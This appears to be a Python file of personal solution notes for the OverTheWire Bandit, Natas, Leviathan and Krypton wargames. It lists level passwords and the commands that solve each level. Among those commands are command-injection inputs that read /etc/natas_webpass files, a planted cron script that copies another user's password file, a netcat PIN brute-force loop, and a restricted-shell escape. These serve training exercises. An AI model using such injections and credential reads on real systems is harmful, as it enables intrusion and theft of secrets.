'''
bandit.labs.overthewire.org
0 bandit0
1 NH2SXQwcBdpmTEzi3bvBHMM9H66vVXjL
2 CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
3 UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
4 pIwrPrtPN36QITSp3EQaw936yaFoFgAB
5 koReBOKuIDDepwhWk7jZC0RTdopnAYKh
6 DXjZPULLxYr17uwoI01bNLQbtFemEgo7
7 HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
8 cvX2JJa4CFALtqS87jk27qwqGhBM9plV
9 UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
10 truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
11 IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
12 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
13 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
14 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
15 BfMYroe26WYalil77FoDi9qh59eK5xNr
16 cluFn7wTiGryunymYOu4RcffSxQluehd
18 kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
19 IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
20 GbKksEFF4yrVs6il55v6gwY5aVje5f0j
21 gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
22 Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
23 jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
24 UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
25 uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
26 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z

leviathan.labs.overthewire.org
0 leviathan0
1 leviathan0
2 rioGegei8m

http://natas0.natas.labs.overthewire.org
0 natas0
1 gtVrDuiDfck831PqWsLEZy5gyDz1clto
2 ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
3 sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
4 Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
5 iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
6 aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
7 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
8 DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
9 W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
10 nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
    win; cat /etc/natas_webpass/natas10 #
11 U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
    z /etc/natas_webpass/natas11 #
'''
import base64
import codecs
import libchall as lc
import string

'''
bandit0 cat readme
bandit1 cat ./-
bandit2 cat spaces\ in\ this\ filename
bandit3 cat inhere/.hidden
bandit4 cat ./inhere/-file0*
bandit5 find ./ -type f -size 1033c | xargs cat
bandit6 find / -type f -readable -user bandit7 -group bandit6 -size 33c 2>/dev/null | xargs cat
bandit7 cat data.txt | grep millionth
bandit8 cat data.txt | sort | uniq -c | egrep '^\s+1\s'
bandit9 strings data.txt  | grep '=='
'''

def bandit10():
    print(base64.b64decode('VGhlIHBhc3N3b3JkIGlzIDZ6UGV6aUxkUjJSS05kTllGTmI2blZDS3pwaGxYSEJNCg=='))

def bandit11():
    T = '5Gr8L4qetPEsPk8htqjhRK8XSP6x2RHh'
    # print(codecs.encode(T, 'rot_13'))
    print (lc.rot_n_phrase("Gur cnffjbeq vf WIAOOSFzMjXXBC0KoSKBbJ8puQm5lIEi",13))

'''
bandit12
    cd `mktemp -d`
    cp ~/data.txt .
    cat data.txt # clearly a hex dump of a file
    file data.txt
    xxd -r data.txt > dump
    file dump
    mv dump data2.bin.gz
    gunzip data2.bin.gz
    file data2.bin
    mv data2.bin data2.bz2
    bzip2 -d data2.bz2
    mv data.txt .data.txt
    file data2
    mv data2 data4.bin.gz
    gunzip data4.bin.gz
    file data4.bin
    mv data4.bin data4.bin.tar
    tar xvf data4.bin.tar
    file data5.bin
    mv data5.bin data5.bin.tar
    tar xvf data5.bin.tar
    file data6.bin
    mv data6.bin data6.bin.bz2
    bzip2 -d data6.bin.bz2
    file data6.bin
    mv data6.bin data6.tar
    tar xvf data6.tar
    file data8.bin
    mv data8.bin data8.gz
    gunzip data8.gz
    file data8
    cat data8
bandit13 ssh -i sshkey.private bandit14@localhost
bandit14 telnet localhost 30000
bandit15 echo 'BfMYroe26WYalil77FoDi9qh59eK5xNr' | openssl s_client -quiet -connect localhost:30001
bandit16
    PORTS=`netstat -tnlp | egrep '3[12][0-9]{3}' | tr ':' ' ' | awk '{print $5}'`
    for i in $PORTS; do echo 'cluFn7wTiGryunymYOu4RcffSxQluehd' | timeout 3 openssl s_client -quiet -connect localhost:$i; done;
    cd `mktemp -d`
    echo ' * paste private key *' > bandit17.key'
    chmod 600 bandit.key
bandit17 diff passwords.old passwords.new
bandit18 ssh bandit18@localhost -- cat readme
bandit19 ./bandit20-do cat /etc/bandit_pass/bandit20
bandit20
    session one = while true; do    echo -e "GbKksEFF4yrVs6il55v6gwY5aVje5f0j"| nc -l -p 1337 -q 1; done
    session two = ./suconnect 1337
bandit21
    cat /etc/cron.d/cronjob_bandit22
    cat /usr/bin/cronjob_bandit22.sh
    cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
bandit22
    cat /usr/bin/cronjob_bandit23.sh
    myname=bandit23
    mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
    echo /tmp/$mytarget
bandit23
  cd `mktemp -d`
  vim gimme.sh
    #!/bin/sh
    cat  /etc/bandit_pass/bandit24 > /tmp/tmp.jRqTAgAW4q/bandit24
    chmod 666 /tmp/tmp.jRqTAgAW4q/bandit24
  chmod 777 gimme.sh
  cp gimme.sh /var/spool/bandit24/
  # just wait until bandit24 pops up in your directory
bandit24
    cd `mktemp -d`
    vim connect.sh
        #!/bin/sh
        echo $1
        (echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $1" | nc localhost 30002) >> output
    chmod +x connect.sh
    for i in $(seq -f "%04g" 9999); do echo $i >> numbers; done;
    cat numbers | xargs -n 1 -P 30 ./connect.sh
    cat output | sort | uniq
bandit26
    cat /etc/passwd | grep bandit26
    make your terminal smaller than the message you get when logging into bandit26
    this causes more not to exit immediately, press "v" and then :r /etc/bandit_pass/bandit26
'''

def krypton2():
    T = 'OMQEMDUEQMEK'
    T2 = ['IMATEST','UYMFQEF']
    for i in range(26):
        if lc.rot_n(T2[0],i) == T2[1]:
            print(i)
    print(lc.rot_n(T,14,True))


def get(fn):
    r = []
    with open(fn,'r') as f:
        for line in f:
            line = line.rstrip()
            r.append(line)
    return r

def krypton3():
    sub = ['JDSQNGWCBKV','thearndiowl']
    trans = string.maketrans(sub[0], sub[1])
    R = [x.translate(trans) for x in get('files\krypton3-2.txt')]
    Z = [x.translate(trans) for x in get('files\krypton3-3.txt')]
    T = [x.translate(trans) for x in get('files\krypton3-found.txt')]
    W = [x.translate(trans) for x in get('files\krypton3-enc.txt')]
    for i in [T,Z,R,W]:
        print('')
        print(' '.join(i))
    # doubles UU VV

bandit11()
